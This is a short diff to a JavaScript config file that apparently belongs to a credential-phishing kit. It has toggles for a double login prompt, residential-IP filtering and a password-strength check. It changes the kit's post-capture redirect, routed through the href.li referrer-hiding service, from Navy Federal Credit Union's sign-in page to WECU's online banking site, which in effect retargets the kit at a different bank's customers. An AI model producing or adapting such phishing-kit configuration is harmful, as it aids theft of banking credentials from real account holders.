@@ -4,5 +4,5 @@ module.exports = {
 	doubleLogin: true, //set to true or false
 	residentialIP: false,
 	passwordStrenthCheck: 2, //set from 2 - 5
-	url: "https://href.li/?https://digitalapps.navyfederal.org/signin/",
+	url: "https://href.li/?https://online.wecu.com",
 };
